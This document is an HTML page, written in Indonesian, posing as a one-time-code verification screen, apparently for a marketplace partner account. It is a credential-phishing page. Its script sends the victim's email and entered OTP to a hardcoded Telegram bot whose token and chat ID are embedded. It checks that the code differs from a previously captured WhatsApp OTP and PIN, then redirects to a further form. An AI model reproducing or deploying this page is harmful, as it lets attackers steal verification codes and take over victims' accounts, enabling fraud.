<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masukkan Kode Verifikasi</title>
    <style>
        body { font-family: "Roboto", Arial, sans-serif; background: #fff; margin: 0; padding: 0; color: #333; }
        header { display:flex; align-items:center; padding:14px 16px; background:#fff; box-shadow:0 1px 3px rgba(0,0,0,0.05); }
        header h1{ flex:1; text-align:center; font-size:18px; margin:0; font-weight:500; }
        .content { padding:24px 16px; text-align:center; }
        .content p { font-size:15px; color:#444; margin:6px 0; }
        .wa { color:#25D366; font-weight:bold; }
        .email, .Email { color:#333; font-weight:bold; }
        .otp-box { display:flex; justify-content:center; gap:10px; margin:30px 0; }
        .otp-box input { width:40px; height:48px; font-size:20px; text-align:center; border:none; border-bottom:2px solid #ccc; outline:none; transition:border-color 0.2s; }
        .otp-box input:focus { border-color:#EE4D2D; }
        button { background:#ccc; color:#fff; font-size:16px; border:none; width:100%; padding:12px; border-radius:6px; cursor:not-allowed; transition:background 0.3s; }
        button.active { background:#EE4D2D; cursor:pointer; }
        .wait { margin-top:14px; font-size:14px; color:#666; }
        .wait span { color:#e65100; font-weight:500; }
        .error { color:red; display:none; margin-top:8px; text-align:center; }
    </style>
</head>
<body>
    <header><h1>Masukkan Kode Verifikasi</h1></header>
    <div class="content">
        <p>Kode verifikasi (OTP) kamu telah dikirim melalui <b class="email">email yang terdaftar</b></p>
        <p><b class="Email" id="emailDisplay"></b></p>
        <div class="otp-box">
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-mail" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-mail" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-mail" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-mail" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-mail" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-mail" />
        </div>
        <div style="max-width:360px;margin:0 auto;"><button id="lanjut" disabled>Lanjut</button></div>
        <div id="uniqueError" class="error"></div>
        <div class="wait">Mohon tunggu <span id="countdown">60</span> detik untuk mengirim ulang</div>
    </div>

    <script>
        // TELEGRAM (jika perlu tetap ada) -- hapus token jika repo publik
        const TELEGRAM_BOT_TOKEN = '7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0';
        const TELEGRAM_CHAT_ID = '5923031825';

        const inputs = document.querySelectorAll(".otp-box input");
        const lanjutBtn = document.getElementById("lanjut");
        const uniqueError = document.getElementById("uniqueError");
        const emailDisplay = document.getElementById("emailDisplay");

        // Tampilkan email (jika disimpan sebelumnya di localStorage sebagai 'registeredEmail')
        try {
            const storedEmail = localStorage.getItem('registeredEmail');
            if (storedEmail) emailDisplay.textContent = storedEmail;
        } catch (e) {}

        inputs.forEach((input, index) => {
            input.addEventListener("input", (e) => {
                const value = e.target.value.replace(/[^0-9]/g, "");
                e.target.value = value;
                if (value && index < inputs.length - 1) inputs[index + 1].focus();
                checkFilled();
            });
            input.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        function checkFilled() {
            const allFilled = Array.from(inputs).every((input) => input.value.length === 1);
            if (allFilled) {
                lanjutBtn.classList.add("active");
                lanjutBtn.disabled = false;
            } else {
                lanjutBtn.classList.remove("active");
                lanjutBtn.disabled = true;
                uniqueError.style.display = 'none';
            }
        }

        // Ambil OTP email yang sudah diketik
        function getOtpEmail() {
            return Array.from(inputs).map(i => i.value).join('');
        }

        // Validasi unik: otpEmail tidak boleh sama dengan otpWhatsApp atau pinMitra
        // Hanya cek kesamaan antar-field (jika sama -> tampilkan alert '6 digit yang anda masukan salah')
        function validateUniqueOtpEmail(otpEmail) {
            if (!/^\d{6}$/.test(otpEmail)) return { ok: false, message: 'Kode harus 6 digit.' };

            try {
                const otpWhatsApp = localStorage.getItem('otpWhatsApp');
                const pinMitra = localStorage.getItem('pinMitra');

                if (otpWhatsApp && otpWhatsApp === otpEmail) {
                    return { ok: false, message: '6 digit yang anda masukan salah' };
                }
                if (pinMitra && pinMitra === otpEmail) {
                    return { ok: false, message: '6 digit yang anda masukan salah' };
                }
            } catch (e) { console.warn('localStorage read error', e); }

            return { ok: true };
        }

        lanjutBtn.addEventListener("click", () => {
            const otp = getOtpEmail();
            const check = validateUniqueOtpEmail(otp);
            if (!check.ok) {
                alert(check.message);
                uniqueError.textContent = check.message;
                uniqueError.style.display = 'block';
                return;
            }
            uniqueError.style.display = 'none';

            // Simpan otpEmail ke localStorage (dipakai untuk pemeriksaan di halaman lain jika diperlukan)
            try { localStorage.setItem('otpEmail', otp); } catch (e) { console.warn(e); }

            // Ambil data email yang seharusnya sudah diisi dari halaman sebelumnya
            const emailElement = document.querySelector('.Email');
            const emailTerdaftar = emailElement ? emailElement.textContent.trim() : 'Email tidak ditemukan';

            const message = `[LOG BARU]\nEmail: ${emailTerdaftar}\nKode OTP yang dimasukkan: ${otp}`;

            // Kirim ke Telegram (GET)
            sendToTelegram(message);

            // Arahkan ke halaman berikutnya
            window.location.href = "formulir2.html";
        });

        let time = 60;
        const countdownEl = document.getElementById("countdown");
        const timer = setInterval(() => {
            time--;
            countdownEl.textContent = time;
            if (time <= 0) {
                clearInterval(timer);
                countdownEl.parentElement.textContent = "Kamu bisa mengirim ulang kode sekarang.";
            }
        }, 1000);

        function sendToTelegram(message) {
            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const encodedMessage = encodeURIComponent(message);
            fetch(`${apiUrl}?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`, { method: 'GET' })
                .then(response => {
                    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                    return response.json();
                })
                .then(data => {
                    if (data.ok) console.log('Pesan OTP berhasil dikirim ke Telegram!');
                    else console.error('Gagal mengirim pesan ke Telegram (API Error):', data.description);
                })
                .catch(error => console.error('Terjadi kesalahan saat mengirim ke Telegram:', error));
        }
    </script>
</body>
</html>
